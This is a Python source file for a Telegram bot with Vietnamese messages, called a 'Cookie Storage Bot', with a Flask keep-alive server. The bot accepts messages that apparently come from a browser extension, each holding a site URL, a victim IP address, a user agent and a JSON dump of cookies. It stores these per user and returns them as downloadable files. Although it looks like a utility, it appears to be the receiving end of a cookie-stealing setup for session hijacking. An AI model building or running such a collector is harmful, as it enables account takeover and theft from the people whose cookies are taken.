import os
import json
import threading
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== FLASK ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)

# Chạy Flask TRƯỚC trong thread riêng
threading.Thread(target=run_flask, daemon=True).start()

# ========== BOT CODE ==========
stored_cookies = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🍪 *Cookie Storage Bot*\n\n"
        "Bot tự động nhận cookies từ extension của bạn\\.\n\n"
        "*Commands:*\n"
        "`/list` \\- Xem tất cả cookies đã lưu\n"
        "`/get <số>` \\- Xem chi tiết cookie theo số thứ tự\n"
        "`/clear` \\- Xóa tất cả cookies\n"
        "`/stats` \\- Thống kê",
        parse_mode='MarkdownV2'
    )

async def list_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in stored_cookies or not stored_cookies[user_id]:
        await update.message.reply_text("❌ Chưa có cookies nào được lưu.")
        return
    
    cookies_list = stored_cookies[user_id]
    result = f"📋 *Danh sách Cookies* ({len(cookies_list)})\n\n"
    
    for i, item in enumerate(cookies_list, 1):
        url = item['url']
        timestamp = item['timestamp']
        cookie_count = len(item['cookies'])
        
        display_url = url.replace('https://', '').replace('http://', '')
        if len(display_url) > 40:
            display_url = display_url[:40] + '...'
        
        result += f"*{i}.* `{display_url}`\n"
        result += f"   🕐 {timestamp}\n"
        result += f"   🍪 {cookie_count} cookies\n\n"
    
    result += f"💡 Dùng `/get <số>` để xem chi tiết"
    
    if len(result) > 4000:
        await update.message.reply_text(
            result[:4000] + "\n\n_(Danh sách quá dài, dùng /clear để xóa cũ)_",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(result, parse_mode='Markdown')

async def get_cookie_detail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("❌ Cách dùng: /get <số thứ tự>")
        return
    
    try:
        index = int(context.args[0]) - 1
    except ValueError:
        await update.message.reply_text("❌ Số thứ tự không hợp lệ!")
        return
    
    if user_id not in stored_cookies or index < 0 or index >= len(stored_cookies[user_id]):
        await update.message.reply_text("❌ Không tìm thấy cookie này!")
        return
    
    item = stored_cookies[user_id][index]
    
    info = f"🍪 *Cookie #{index + 1}*\n\n"
    info += f"*URL:* `{item['url']}`\n"
    info += f"*Thời gian:* {item['timestamp']}\n"
    info += f"*IP:* {item.get('ip', 'N/A')}\n"
    info += f"*User Agent:* {item.get('user_agent', 'N/A')[:50]}...\n\n"
    info += f"*Số lượng cookies:* {len(item['cookies'])}"
    
    await update.message.reply_text(info, parse_mode='Markdown')
    
    cookies_json = json.dumps(item['cookies'], indent=2)
    
    import io
    file = io.BytesIO(cookies_json.encode())
    file.name = f"cookies_{index + 1}.json"
    
    await update.message.reply_document(
        document=file,
        caption=f"📄 Cookie data for: {item['url']}"
    )

async def clear_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in stored_cookies:
        count = len(stored_cookies[user_id])
        del stored_cookies[user_id]
        await update.message.reply_text(f"🗑️ Đã xóa {count} cookies!")
    else:
        await update.message.reply_text("❌ Không có cookies để xóa.")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in stored_cookies or not stored_cookies[user_id]:
        await update.message.reply_text("❌ Chưa có dữ liệu.")
        return
    
    cookies_list = stored_cookies[user_id]
    total_cookies = sum(len(item['cookies']) for item in cookies_list)
    
    result = "📊 *Thống kê*\n\n"
    result += f"🌐 Số trang web: {len(cookies_list)}\n"
    result += f"🍪 Tổng cookies: {total_cookies}\n"
    result += f"🕐 Cookie đầu tiên: {cookies_list[0]['timestamp']}\n"
    result += f"🕐 Cookie mới nhất: {cookies_list[-1]['timestamp']}"
    
    await update.message.reply_text(result, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    try:
        lines = text.split('\n')
        url = None
        ip = None
        user_agent = None
        cookies_json = None
        
        for i, line in enumerate(lines):
            if '❄️ *URL:*' in line or 'URL:' in line:
                url = line.split('URL:')[-1].strip().replace('*', '').replace('`', '')
            elif '🎄 *IP:*' in line or 'IP:' in line:
                ip = line.split('IP:')[-1].strip().replace('*', '').replace('`', '')
            elif '⛄ *User Agent:*' in line or 'User Agent:' in line:
                user_agent = line.split('Agent:')[-1].strip().replace('*', '').replace('`', '')
            elif '```json' in line:
                json_start = text.find('```json') + 7
                json_end = text.find('```', json_start)
                cookies_json = text[json_start:json_end].strip()
                break
        
        if not cookies_json:
            return
        
        cookies = json.loads(cookies_json)
        
        if user_id not in stored_cookies:
            stored_cookies[user_id] = []
        
        stored_cookies[user_id].append({
            'url': url or 'Unknown',
            'ip': ip or 'Unknown',
            'user_agent': user_agent or 'Unknown',
            'cookies': cookies,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
        cookie_count = len(cookies)
        await update.message.reply_text(
            f"✅ Đã lưu {cookie_count} cookies từ:\n`{url}`\n\n"
            f"Tổng: {len(stored_cookies[user_id])} entries\n"
            f"Dùng /list để xem tất cả",
            parse_mode='Markdown'
        )
        
    except json.JSONDecodeError:
        pass
    except Exception as e:
        print(f"Error: {e}")

def main():
    BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
    
    if not BOT_TOKEN:
        print("⚠️  TELEGRAM_BOT_TOKEN not set!")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("list", list_cookies))
    application.add_handler(CommandHandler("get", get_cookie_detail))
    application.add_handler(CommandHandler("clear", clear_cookies))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Bot đang chạy 24/7...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
